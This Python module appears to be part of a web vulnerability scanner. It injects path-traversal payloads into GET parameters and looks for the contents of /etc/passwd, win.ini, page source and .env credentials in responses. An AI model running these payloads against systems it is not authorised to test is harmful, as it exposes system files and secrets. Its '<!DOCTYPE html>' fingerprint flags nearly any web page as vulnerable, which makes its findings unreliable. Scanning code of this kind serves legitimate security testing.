import requests
from urllib.parse import urlencode

def run_lfi_scan(base_url, endpoints, session):
    """
    LFI (Local File Inclusion) Scanner:
    1. Identify GET endpoints with parameters
    2. Inject LFI payloads (../../ etc)
    3. Check for specific system file content (e.g., /etc/passwd or Windows boot.ini)
    """
    print(f"\n[LFI] Starting scan on {base_url}")
    
    # LFI payloads
    payloads = [
        "/etc/passwd",
        "../../../../../../../../etc/passwd",
        "/windows/win.ini",
        "../../../../../../../../windows/win.ini",
        "templates/index.html", # Testing if we can read source
        ".env"
    ]
    
    # Fingerprints to match in response
    fingerprints = [
        "root:x:0:0:", # /etc/passwd
        "[extensions]", # win.ini
        "<!DOCTYPE html>", # index.html
        "DB_PASSWORD=" # .env
    ]
    
    findings = []
    get_endpoints = [e for e in endpoints if e.get("method") == "GET" and e.get("params")]
    
    for endpoint in get_endpoints:
        target_url = endpoint.get("url")
        params = endpoint.get("params", [])
        
        for param in params:
            param_name = param.get("name")
            for payload in payloads:
                query_params = {p.get("name"): p.get("value", "test") for p in params}
                query_params[param_name] = payload
                
                test_url = f"{target_url.split('?')[0]}?{urlencode(query_params)}"
                
                try:
                    print(f"[LFI] Testing parameter '{param_name}' at: {test_url}")
                    response = session.get(test_url, timeout=10)
                    
                    # Check if any fingerprint is in the response
                    for fp in fingerprints:
                        if fp in response.text:
                            print(f"[LFI] VULNERABILITY FOUND AT: {test_url}")
                            findings.append({
                                "url": test_url,
                                "endpoint": target_url.split('?')[0],
                                "parameter": param_name,
                                "payload": payload,
                                "confidence": "High",
                                "vulnerability_type": "Local File Inclusion",
                                "impact": "Local File Inclusion (LFI) allows an attacker to read sensitive files on the server or execute arbitrary code if combined with other flaws.",
                                "reason": f"Found fingerprint matching a sensitive file in the response."
                            })
                            break
                    if any(fp in response.text for fp in fingerprints): break
                except Exception as e:
                    print(f"[LFI] Error testing {test_url}: {e}")
                    
    print(f"[LFI] Scan complete. Found {len(findings)} issues.")
    return findings
